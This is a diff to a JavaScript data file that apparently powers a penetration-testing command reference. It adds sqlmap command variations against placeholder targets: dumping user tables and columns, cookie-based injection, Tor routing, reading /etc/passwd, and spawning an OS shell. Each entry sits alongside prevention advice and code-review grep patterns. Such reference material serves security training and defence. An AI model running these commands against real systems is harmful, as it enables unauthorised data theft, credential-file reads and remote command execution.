@@ -71323,7 +71323,17 @@ const COMMAND_DATA = {
         "prevention": "**Critical**: disable DB error display in production. PHP: `mysqli_report(MYSQLI_REPORT_OFF)` + custom error handler. Return only generic 'Something went wrong' messages. Error messages should only appear in server-side logs, never in HTTP responses.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Log full HTTP traffic",
+          "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -t /tmp/traffic.txt --batch"
+        },
+        {
+          "label": "Show injected payloads",
+          "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -v 3 --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-passwords",
@@ -71495,7 +71505,25 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries. DB instance isolation (each application on its own DB server). Even one exploited application should not expose all other applications' data.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Dump a specific table",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --batch"
+        },
+        {
+          "label": "Dump specific columns",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users -C name,surname --batch"
+        },
+        {
+          "label": "Filter rows (WHERE)",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --where=\"name LIKE 'f%'\" --batch"
+        },
+        {
+          "label": "Row range",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --start=2 --stop=3 --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-schema",
@@ -71769,7 +71797,17 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries. INFORMATION_SCHEMA access cannot be fully blocked for a user with any table grants — DB isolation at the instance level is the only complete mitigation.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "List columns of a table",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --columns -T users -D <db> --batch"
+        },
+        {
+          "label": "Dump the table",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D <db> --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-eval",
@@ -72021,7 +72059,17 @@ const COMMAND_DATA = {
         "prevention": "Never use cookie values directly in SQL queries — look up user data by session token from server-side session store, not by reading a DB ID from the cookie.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Session cookie",
+          "command": "sqlmap -u \"http://<target>/\" --cookie='PHPSESSID=<sess>' --batch"
+        },
+        {
+          "label": "Cookie via header",
+          "command": "sqlmap -u \"http://<target>/\" -H='Cookie:PHPSESSID=<sess>' --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-install",
@@ -72192,7 +72240,13 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries. Even with injection: least-privilege user with GRANT on only the specific application DB still exposes that DB's schema via INFORMATION_SCHEMA (INFORMATION_SCHEMA is readable for granted schemas). True isolation requires separate DB instances per application.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Current database only",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --current-db --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-os-shell",
@@ -72458,7 +72512,13 @@ const COMMAND_DATA = {
         "prevention": "IP-based controls are insufficient alone. Detect by behavior (request pattern, payload signatures) not source IP. Tor exit node blocklists provide partial mitigation. Parameterized queries make the source IP irrelevant — injection fails regardless.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Route through Tor",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --tor --tor-type=SOCKS5 --check-tor --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-randomize",
@@ -72631,7 +72691,13 @@ const COMMAND_DATA = {
         "prevention": "Revoke FILE privilege from app DB user (GRANT SELECT, INSERT ON myapp.* TO 'webapp'@'localhost' — no FILE). Set MySQL secure_file_priv='/var/lib/mysql-files/' — restricts LOAD_FILE to that directory. Parameterized queries prevent the injection prerequisite.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Fallback when retrieval fails",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --file-read \"/etc/passwd\" --hex --no-cast"
+        }
+      ]
     },
     {
       "id": "sqlmap-detection-tuning",
@@ -72807,7 +72873,17 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries eliminate all techniques. As defence-in-depth: disable DB error display (kills error-based), use a WAF (signature-blocks UNION/SLEEP), set query timeouts on the DB connection (limits time-based effectiveness).",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Time-based blind only",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --technique=T --batch"
+        },
+        {
+          "label": "Error-based for OS shell",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell --technique=E"
+        }
+      ]
     },
     {
       "id": "sqlmap-request-file",
@@ -72989,7 +73065,13 @@ const COMMAND_DATA = {
         "prevention": "Parameterized queries eliminate the SQLi prerequisite. Sensitive column naming conventions (obfuscating 'password' as 'user_credential_hash') provide minimal obscurity benefit — not a real control.",
         "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Search tables by name",
+          "command": "sqlmap -u \"http://<target>/?id=1\" --search -T user --batch"
+        }
+      ]
     },
     {
       "id": "sqlmap-tamper",
@@ -90633,7 +90715,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-08T10:27:52.984Z",
+  "buildDate": "2026-09-08T10:32:21.623Z",
   "certifications": [
     "CDSA",
     "CPTS",
